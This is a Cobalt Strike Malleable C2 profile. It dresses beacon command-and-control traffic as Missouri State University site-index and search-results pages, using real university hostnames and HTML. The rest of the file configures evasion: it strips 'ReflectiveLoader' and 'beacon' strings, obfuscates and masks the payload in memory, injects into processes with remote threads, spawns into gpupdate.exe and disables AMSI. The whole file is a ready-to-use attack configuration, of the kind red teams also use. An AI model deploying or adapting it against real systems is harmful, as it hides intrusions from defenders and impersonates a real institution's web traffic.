#MSU education site profile
#xx0hcd

###Global Options###
set sample_name "msu_edu.profile";

set sleeptime "37500";
set jitter    "33";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/587.38 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36";

#set host_stage "false";

###DNS options###
set dns_idle "8.8.8.8";
set maxdns    "245";
set dns_sleep "0";
set dns_stager_prepend "";
set dns_stager_subhost "";
set dns_max_txt "252";
set dns_ttl "1";

###SMB options###
set pipename "ntsvcs";
set pipename_stager "scerpc";

###TCP options###
set tcp_port "8000";

###SSL Options###
#https-certificate {
    #set keystore "your_store_file.store";
    #set password "your_store_pass";
#}

#https-certificate {
#    set C "US";
#    set CN "whatever.com";
#    set L "California";
#    set O "whatever LLC.";
#    set OU "local.org";
#    set ST "CA";
#   set validity "365";
#}

#code-signer {
    #set keystore "your_keystore.jks";
    #set password "your_password";
    #set alias "server";
#}

###HTTP-Config Block###
http-config {
    #set headers "Server, Content-Type";
    #header "Content-Type" "text/html;charset=UTF-8";
    #header "Server" "nginx";

    set trust_x_forwarded_for "false";
}

###HTTP-GET Block###
http-get {

    set uri "/siteindex/a/ /siteindex/b/ /siteindex/c/";

    #set verb "POST";
    
    client {

        header "Host" "search.missouristate.edu";
        header "Accept" "*/*";
        header "Accept-Language" "en";
        header "Connection" "close";

	   
    metadata {
        #base64
        base64url;
        #mask;
        #netbios;
        #netbiosu;
        #prepend "TEST123";
        #append ".php";

        parameter "filter";
        #header "Cookie";
        #uri-append;

        #print;
    }

    #parameter "test1" "test2";
    }

    server {
        header "Cache-Control" "private";
        header "Content-Type" "text/html; charset=utf-8";
        header "Vary" "User-Agent";
        header "Server" "Microsoft-IIS/8.5";
        header "BackendServer" "Handle";
        header "X-UA-Compatible" "IE=edge";
        header "Connection" "close";
        header "Set-Cookie" "WWW-SERVERID=handle; path=/";
 
        output {

            netbios;
            #netbiosu;
            #base64;
            #base64url;
            #mask;
  
            prepend "    <link href=\"/resource/styles\" media=\"all\" rel=\"stylesheet\" />    <script src=\"https://missouristate.info/scripts/2018/common.js?_q=";
            prepend "    <meta name=\"robots\" content=\"noindex\" /><link rel=\"Stylesheet\" media=\"all\" href=\"https://missouristate.info/styles/msuwds/main-sgf.css\" />\n";
            prepend "    <meta name=\"vireport\" content=\"width=device-width, initial-scale=1.0\" />\n";   
            prepend "    <title>A - Site Index - Missouri State University</title>\n";
            prepend "    <meta charset=\"UTF-8\" />\n";
            prepend "<head>";     	       
	    prepend "<html lang=\"en\" itemscope itemtype=\"https://schema.org/SearchResultsPage\">\n";
            prepend "<!DOCTYPE html>\n";

	    append "\"></script>\n";
            append "<h2>About search</h2>\n";
	    append "<ul>\n";
	    append "<li><a href=\"https://www.missouristate.edu/web/search/aboutwebsearch.htm\">About web search</a></li>]n";
	    append "<li><a href=\"https://www.missouristate.edu/web/search/aboutpeoplesearch.htm\">About people search</a></li>\n";
	    append "<li><a href=\"https://www.missouristate.edu/web/search/abouteventsearch.htm\">About event search</a></li>\n";
	    append "<li><a href=\"https://www.missouristate.edu/web/search/aboutmapsearch.htm\">About map search</a></li>";
	    append "</ul>\n";
	    append "</div>";

            print;
        }
    }
}

###HTTP-Post Block###
http-post {
    
    set uri "/getsearchresults";
    #set verb "GET";
    set verb "POST";

    client {

#	header "Host" "search.missouristate.edu";
	header "Connection" "close";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";   
        
        output {
            base64url; 
	    parameter "site_indexFilter";
        }

        id {
	    base64url;
	    parameter "peopleFilter";

        }

    parameter "eventsFilter" "campus:sgf";
#    parameter "mapFilter" "campus";
    parameter "query" "my%20missouri%20state";
    parameter "resultCounts" "5,3,3,3&";

    }

    server {
        header "Cache-Control" "private";
        header "Content-Type" "application/json; charset=utf-8";
        header "Vary" "User-Agent,AcceptEncoding";
        header "Server" "Microsoft-IIS/8.5";
        header "BackendServer" "Handle";
        header "X-UA-Compatible" "IE=edge";
        header "Connection" "close";

        output {
            netbios;	    
	   
	    prepend "[\"{\\\"results\\\":[\\\"{\\\\\\\"ID\\\\\\\":\\\\\\\"Missouri State University Foundation\\\\\\\",\\\\\\\"Name\\\\\\\":\\\\\\\"Missouri State University Foundation\\\\\\\",\\\\\\\"Url\\\\\\\":\\\\\\\"https://www.missouristatefoundation.org/\\\\\\\",\\\\\\\"Keywords\\\\\\\":";

	    append "\"\\\\\\\"development; endowment; foundation; Foundation, Missouri State; fundraising; missouri state foundation; missouri state university foundation\\\\\\\",\\\\\\\"UnitType\\\\\\\":\\\\\\\"Department\\\\\\\"}\\\",\\\"{\\\\\\\"ID\\\\\\\":\\\\\\\"Missouri State Outreach\\\\\\\",\\\\\\\"Name\\\\\\\":\\\\\\\"Missouri State Outreach\\\\\\\",\\\\\\\"Url\\\\\\\":\\\\\\\"https://outreach.missouristate.edu/\\\\\\\",\\\\\\\"Keywords\\\\\\\":\\\\\\\"distance learning; dual credit; evening; extended campus; Extended Campus (now Missouri State Outreach); i courses; i-courses; icourses; interactive video; itv; non credit; non-credit; noncredit; off campus; off-campus; offcampus; online; outreach; Outreach, Missouri State\\\\\\\"}\"]";

            print;
        }
    }
}

###HTTP-Stager Block###
http-stager {

    set uri_x86 "/Events";
    set uri_x64 "/events";

    client {
        header "Host" "search.missouristate.com";
        header "Accept" "*/*";
        header "Accept-Language" "en";
        header "Connection" "close";

        #parameter "test1" "test2";
    }

    server {
        header "Cache-Control" "private";
        header "Content-Type" "private";
        header "Vary" "User-Agent";
        header "Server" "Microsoft-IIS/8.5";
        header "BackendServer" "Handle";
        header "X-UA-Compatible" "IE=edge";
        header "Connection" "close";
        header "Set-Cookie" "WWW-SERVERID=handle; path=/";  

        output {
        
            #prepend "content=";

            #append "</script>\n";
            print;
        }  

    }
}


###Malleable PE/Stage Block###
stage {
    set checksum        "0";
    set compile_time    "23 Nov 2018 02:25:37";
    set entry_point     "170000";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	        "WWanMM.dll";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "";
    
    set sleep_mask "true";

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    #string "something";
    #data "something";
    #stringw "something"; 
}

###Process Inject Block###
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "false";
        
    transform-x86 {
        prepend "\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90";
    }

    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        CreateThread;
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";

}
